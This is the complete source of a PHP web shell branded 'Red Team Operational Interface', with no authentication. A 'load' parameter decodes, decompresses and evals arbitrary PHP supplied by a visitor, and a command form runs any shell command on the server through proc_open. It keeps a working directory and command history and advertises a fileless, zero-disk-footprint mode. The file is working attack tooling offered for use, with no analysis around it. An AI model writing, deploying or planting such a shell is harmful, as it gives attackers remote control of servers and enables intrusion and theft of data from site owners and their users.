<?php
// Code Created By: Cracnom - January 5, 2026 - Webshell Fiwas
declare(strict_types=1);

if (isset($_GET['load']) && !empty($_GET['load'])) {
    $payload = @gzuncompress(base64_decode($_GET['load']));
    if ($payload === false) {
        http_response_code(404);
        exit('Invalid payload');
    }

    $__code = function () use ($payload) {
        eval('?>' . $payload);
    };
    $old_ob = ob_get_level();
    ob_start();
    try {
        $__code();
    } catch (Throwable $e) {
        echo "Runtime error: " . htmlspecialchars($e->getMessage());
    }
    while (ob_get_level() > $old_ob) ob_end_clean();
    exit;
}

session_start();

const S_CWD   = 'c';
const S_HIST  = 'h';
const S_OUT   = 'o';
const P_CMD   = 'x';
const P_ROWS  = 'r';
const P_RESET = 'z';

if (!isset($_SESSION[S_CWD]) || isset($_REQUEST[P_RESET])) {
    $_SESSION[S_CWD] = getcwd() ?: '/';
    $_SESSION[S_HIST] = [];
    $_SESSION[S_OUT]  = '';
}

if (!empty($_REQUEST[P_CMD])) {
    $cmd = $_REQUEST[P_CMD];

    if (($idx = array_search($cmd, $_SESSION[S_HIST])) !== false) {
        unset($_SESSION[S_HIST][$idx]);
    }
    array_unshift($_SESSION[S_HIST], $cmd);
    $_SESSION[S_HIST] = array_values($_SESSION[S_HIST]);

    $_SESSION[S_OUT] .= "$ $cmd" . PHP_EOL;

    if (preg_match('/^\s*cd\s*$/', $cmd)) {
        $target = dirname(__FILE__);
    } elseif (preg_match('/^\s*cd\s+(.+)$/', $cmd, $m)) {
        $raw = $m[1];
        $target = $raw[0] === '/' ? $raw : $_SESSION[S_CWD] . '/' . $raw;
        $target = @realpath($target) ?: $target;
        $target = preg_replace('#//+#', '/', $target);
        $target = preg_replace('#/\./#', '/', $target);
        while (preg_match('#/[^/]+/\.\.(?:/|$)#', $target)) {
            $target = preg_replace('#/[^/]+/\.\.(?:/|$)#', '/', $target);
        }
        $target = rtrim($target, '/') ?: '/';
    } else {
        $target = null;
    }

    if ($target !== null) {
        if (is_dir($target) && @chdir($target)) {
            $_SESSION[S_CWD] = getcwd() ?: $target;
        } else {
            $_SESSION[S_OUT] .= "cd: no such directory: $target" . PHP_EOL;
        }
    } else {
        chdir($_SESSION[S_CWD]);

        $proc = proc_open($cmd, [
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w']
        ], $pipes);

        if (is_resource($proc)) {
            $out = stream_get_contents($pipes[1]) . stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($proc);
            $_SESSION[S_OUT] .= htmlspecialchars($out, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
        } else {
            $_SESSION[S_OUT] .= "Execution failed." . PHP_EOL;
        }
    }
}

$js_hist = empty($_SESSION[S_HIST])
    ? '""'
    : '"' . implode('", "', array_map('addslashes', $_SESSION[S_HIST])) . '"';

header('Content-Type: text/html; charset=UTF-8');
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>RT Access Point</title>
    <style>
        body{background:#000;color:#0f9;font-family:'Courier New',monospace;margin:0;padding:15px;}
        .wrap{max-width:1200px;margin:auto;}
        .hdr{background:#111;padding:10px;text-align:center;border-bottom:2px solid #0f9;}
        .path{color:#ff9;font-weight:bold;}
        textarea{width:100%;height:520px;background:#000;color:#0f9;border:1px solid #333;padding:10px;font-size:14px;}
        .in{margin-top:10px;}
        input[type=text]{background:#000;color:#0f9;border:2px inset #0f9;padding:8px;font-size:14px;width:75%;}
        input[type=submit]{background:#111;color:#0f9;border:2px outset #0f9;padding:8px 16px;cursor:pointer;}
    </style>
    <script>
        const hist = [<?php echo $js_hist; ?>];
        let pos = hist.length;
        function nav(e){if(e.keyCode===38&&pos<hist.length-1){hist[pos]=document.f.cmd.value;pos++;document.f.cmd.value=hist[pos];}
        else if(e.keyCode===40&&pos>0){hist[pos]=document.f.cmd.value;pos--;document.f.cmd.value=hist[pos];}}
        window.onload=()=>{document.f.cmd.focus();document.getElementById('o').scrollTop=document.getElementById('o').scrollTopMax;}
    </script>
</head>
<body>
<div class="wrap">
    <div class="hdr">
        <h2>Red Team Operational Interface</h2>
        <p>Path: <span class="path"><?php echo htmlspecialchars($_SESSION[S_CWD], ENT_QUOTES, 'UTF-8'); ?></span></p>
    </div>

    <form name="f" method="POST" autocomplete="off">
        <div class="in">
            <span style="color:#0ff">$</span>
            <input type="text" name="<?php echo P_CMD; ?>" onkeyup="nav(event)" autofocus>
            <input type="submit" value="Exec">
            <input type="text" name="<?php echo P_ROWS; ?>" value="<?php echo (int)($_REQUEST[P_ROWS]??35); ?>" size="3">
            <input type="submit" name="<?php echo P_RESET; ?>" value="Reset">
        </div>

        <textarea id="o" readonly><?php
            $lines = substr_count($_SESSION[S_OUT], "\n");
            $need = max(1, (int)($_REQUEST[P_ROWS]??35));
            echo str_repeat("\n", max(0, $need - $lines)) . rtrim($_SESSION[S_OUT]);
        ?></textarea>
    </form>

    <div style="text-align:center;margin-top:20px;color:#444;font-size:11px;">
        Fileless-capable • Zero disk footprint mode available
    </div>
</div>
</body>
</html>
